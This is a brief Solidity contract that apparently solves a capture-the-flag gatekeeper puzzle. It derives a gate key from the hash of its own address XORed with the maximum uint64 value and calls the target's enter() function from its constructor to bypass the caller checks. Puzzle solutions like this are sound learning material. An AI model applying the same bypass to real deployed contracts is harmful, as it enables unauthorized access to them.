// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperSolution {
  
    constructor(address gatekeeper) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        IGatekeeper(gatekeeper).enter(key);
    }
}
